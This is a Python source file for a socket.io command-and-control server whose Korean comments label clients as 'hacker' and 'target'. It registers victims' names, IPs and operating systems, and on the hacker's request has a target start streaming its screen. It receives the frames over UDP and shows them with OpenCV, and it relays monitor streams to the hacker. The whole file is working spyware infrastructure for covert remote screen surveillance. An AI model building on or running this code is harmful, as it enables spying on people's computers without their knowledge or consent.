import numpy as np
from socketio import Server, WSGIApp
import socket
import struct
import pickle
import cv2

sio = Server()
app = WSGIApp(sio)

targets = []

@sio.event
def connect(sid, environ, auth):
  print('connect ', sid)
  sio.emit('info', room=sid)

@sio.event
def disconnect(sid):
  global targets
  print('disconnect ', sid)
  for i, v in enumerate(targets):
    if v['sid'] == sid:
      targets.pop(i)
      sio.emit('del target', {'sid': sid})
      break


# 해커로부터 오는 요청
@sio.on('target list')
def getTargetList(sid):
  sio.emit('t list', {'targets': targets}, room=sid)

@sio.on('remote req')
def remoteReq(sid, data):
  sio.emit('remote start', room=data['target'])

  sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

  sock.bind(('',8001))
  s = [b'\xff' * 46080 for x in range(20)]
  while True:
    picture = b''

    data, addr = sock.recvfrom(46081)
    s[data[0]] = data[1:46081]

    if data[0] == 19:
      for i in range(20):
        picture += s[i]

      frame = np.fromstring(picture, dtype=np.uint8)
      frame = frame.reshape(480, 640, 3)
      cv2.imshow("frame", frame)

      if cv2.waitKey(1) & 0xFF == ord('q'):
        cv2.destroyAllWindows()
        break

@sio.on('stop remote')
def stopStream(sid, data):
  sio.emit('stop remote', room=data['target'])


# 타겟으로부터 오는 요청
@sio.on('my info')
def setTargetInfo(sid, data):
  print(data['name'])
  targets.append({
    'name': data['name'],
    'ip': data['ip'],
    'os': data['os'],
    'sid': sid
  })
  print(targets)

@sio.on('stream monitor')
def stream(sid, data):
  sio.emit('stream', {'src': data['src']}, room=data['hacker'])